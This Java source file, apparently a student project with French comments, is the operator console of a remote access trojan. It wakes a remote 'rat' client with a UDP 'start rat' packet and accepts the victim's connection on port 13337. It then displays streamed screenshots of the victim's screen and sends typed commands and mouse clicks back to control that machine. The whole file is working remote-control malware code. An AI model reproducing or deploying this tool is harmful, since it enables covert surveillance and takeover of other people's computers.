package hacker;

import java.awt.MouseInfo;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.awt.event.WindowStateListener;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.nio.ByteBuffer;
import java.util.Scanner;

import javax.imageio.ImageIO;
import javax.swing.Icon;
import javax.swing.ImageIcon;

import common.MouseAction;

public class HackerExe {
	private static DatagramSocket m_sock;

	private static int clientResolutionX;
	private static int clientResolutionY;

	private static int clientMousePostionX;
	private static int clientMousePostionY;
	
	
	/* Affichage */
	private static int frameWidth;
	private static int frameHeight;
	private static FrameClientScreen fcs;

	/* Réseau */
	private static final int portServeur = 13337;
	private InetSocketAddress adrDest = new InetSocketAddress(portServeur);

	private String ipClient;
	private int portClient;
	private int portTelecommandeClient = 54321;
	private int portTelecommandeRatClient = 54322;

	private DatagramSocket socket_send;

	private static ServerSocket listenSocket;
	private static Socket socketConnexion;

	
	public HackerExe() {
		System.out.println("	  _   _            _             ");
		System.out.println("	 | | | |          | |            ");
		System.out.println("	 | |_| | __ _  ___| | _____ _ __ ");
		System.out.println("	 |  _  |/ _` |/ __| |/ / _ \\ '__|");
		System.out.println("	 | | | | (_| | (__|   <  __/ |   ");
		System.out.println("	 \\_| |_/\\__,_|\\___|_|\\_\\___|_|   ");
		System.out.println("\n\t ______________________________\n");
		System.out.println("Serveur en écoute sur le port : " + portServeur);
	}
	
	public static void main (String [] args) throws IOException, InterruptedException {
		HackerExe h = new HackerExe();

		h.wakeUpClient();
		h.initListen();
		h.getClientScreenResolution();
		h.execute();
		h.forwardTelecommande();
		h.executeAction();
	}
	
	
	private void executeAction() {
		
		/***********************************************************************/
		new Thread(new Runnable() {
		     public void run() {
		    	 
		    	 	fcs.getLblImage().addMouseListener(new MouseListener() {
		    			
		 			@Override
		 			public void mouseClicked(MouseEvent e) {
		 				System.out.println("x = " +e.getX() + " et y = "+e.getY());
		 				try { serializeAndSend( new MouseAction(MouseAction.typeMouseAction.Click, e.getX(), e.getY()) );} 
		 				catch (IOException e1) {e1.printStackTrace();}
		 			}
	
		 			

					@Override
		 			public void mousePressed(MouseEvent e) {}
	
		 			@Override
		 			public void mouseReleased(MouseEvent e) {}
	
		 			@Override
		 			public void mouseEntered(MouseEvent e) {}
	
		 			@Override
		 			public void mouseExited(MouseEvent e) {}
		 		});
		    	 
		    	 /*while(true) {
		    		try { sendToClient(  ); } 
		    		catch (IOException e) { e.printStackTrace(); break; }
		    	 }*/
		     }
		}).start();
		/***********************************************************************/		
	}

	private void wakeUpClient() throws IOException {
		DatagramSocket socket_send = new DatagramSocket(null);
		byte[] bufR = new byte[2048];
		DatagramPacket dpR = new DatagramPacket(bufR, bufR.length);
		bufR = new String("start rat").getBytes();
		System.out.println("IP du Client :");
		String ipWakeUp = new Scanner(System.in).nextLine();

		dpR = new DatagramPacket(bufR, bufR.length, new InetSocketAddress(ipWakeUp, portTelecommandeClient));
		socket_send.send(dpR);	
	}


	private void forwardTelecommande() {
		
		/***********************************************************************/
		new Thread(new Runnable() {
		     public void run() {
		    	 
		    	 while(true) {
		    		 System.out.print("Commande : ");
		    		String lineScanned = new Scanner(System.in).nextLine();
		    		try { sendToClient( lineScanned, portTelecommandeClient ); } 
		    		catch (IOException e) { e.printStackTrace(); break; }
		    	 }
		     }
		}).start();
		/***********************************************************************/
	}


	private void execute() throws IOException {
		
		/***********************************************************************/
				new Thread(new Runnable() {
				     public void run() {
				    	 
				    	 while (true) {
					    	 try { printClientInterface(); } 
					    	 catch (IOException | InterruptedException e) { e.printStackTrace(); break; } 
				    	 }
				     }
				}).start();
		/**********************************************************************/
	}
			
	


	private static void printClientInterface() throws IOException, InterruptedException {
		while(true) {
			String msg = new String();
			try { 
				msg = receiveTCP();
				if (msg.matches(".*ScreenSize=.*")){
				    BufferedImage img = ImageIO.read(ImageIO.createImageInputStream(socketConnexion.getInputStream()));
				    fcs.getLblImage().setIcon(new ImageIcon(img));
				}
			}
			catch (Exception e) { System.err.println("Fenêtre client fermée !"); e.printStackTrace(); System.exit(0); }

		}
	}
	


	private void getClientScreenResolution() throws IOException {

		String msg = null;
		try { msg = receiveTCP();} 
		catch (IOException e) {e.printStackTrace();	}
		
		if (msg.matches(".*Resolution.*")) {
			String[] resolution = msg.split(":");

			clientResolutionX = Integer.parseInt(msg.substring(msg.indexOf("=")+1, msg.indexOf(":")));
			clientResolutionY = Integer.parseInt(msg.substring(msg.indexOf(":")+1, msg.length()));
			frameWidth = (2*clientResolutionX/3);
			frameHeight = (2*clientResolutionY/3);
			
			System.out.println("Resolution recue : " + frameWidth + "*" + frameHeight);
			fcs.setBounds(2000, 100, frameWidth+18, frameHeight+65);
		}

	}


	private void initListen() throws IOException {
		listenSocket = new ServerSocket();
		listenSocket.bind(adrDest);
		socketConnexion = listenSocket.accept();
		
		ipClient = socketConnexion.getInetAddress().getHostAddress();
		portClient = socketConnexion.getPort();
		
		System.out.println("Connexion de "+ ipClient +":" + portClient);
		fcs = new FrameClientScreen();
		fcs.addWindowListener(new WindowListener() {
			
			@Override
			public void windowClosing(WindowEvent e) {
				try { sendToClient("down socket", portTelecommandeRatClient); } 
				catch (IOException e1) { e1.printStackTrace(); }				
			}
			
			@Override
			public void windowOpened(WindowEvent e) {}
			@Override
			public void windowIconified(WindowEvent e) {}
			@Override
			public void windowDeiconified(WindowEvent e) {}
			@Override
			public void windowDeactivated(WindowEvent e) {}
			@Override
			public void windowClosed(WindowEvent e) {}
			@Override
			public void windowActivated(WindowEvent e) {}
		});
		fcs.setVisible(true);
	}

	
	/*public void envoyer(String msg, String adresse, int port) throws IOException {
		this.adrDest = new InetSocketAddress(adresse, port);
		byte[] bufE = msg.getBytes();
		OutputStream os = socketConnexion.getOutputStream();
		System.out.println("Message à :"+adresse+":"+port+" : "+msg.toString());
		socket_send = new DatagramSocket(null);
		socket_send.send(p);
		return;
	}*/
	

	protected void sendToClient(String msg, int portClient) throws IOException {
		 socket_send = new DatagramSocket(null);
		 byte[] bufR = new byte[2048];
		 DatagramPacket dpR = new DatagramPacket(bufR, bufR.length);
		 bufR = new String(msg).getBytes();
		 dpR = new DatagramPacket(bufR, bufR.length, new InetSocketAddress(ipClient, portClient));
		 socket_send.send(dpR);		
	}
	
	
	private void serializeAndSend(MouseAction mouseAction) throws IOException {
		// Serialize to a byte array
		ByteArrayOutputStream bStream = new ByteArrayOutputStream();
		ObjectOutput oo = new ObjectOutputStream(bStream); 
		oo.writeObject(mouseAction);
		oo.close();
		byte[] serializedObject = bStream.toByteArray();
		
		/* Envois à la télécommande du client */
		DatagramSocket socket_send = new DatagramSocket(null);
		DatagramPacket dpR = new DatagramPacket(serializedObject, serializedObject.length);
		dpR = new DatagramPacket(serializedObject, serializedObject.length, new InetSocketAddress(ipClient, 54322));
		socket_send.send(dpR);		
	}
	
	private static String receiveTCP() throws IOException {
		byte[] bufR = new byte[2048];
		InputStream is = socketConnexion.getInputStream();
		int lenBufR = is.read(bufR);
		String msgRecu = new String(bufR, 0 , lenBufR );
		return msgRecu;
	}
}
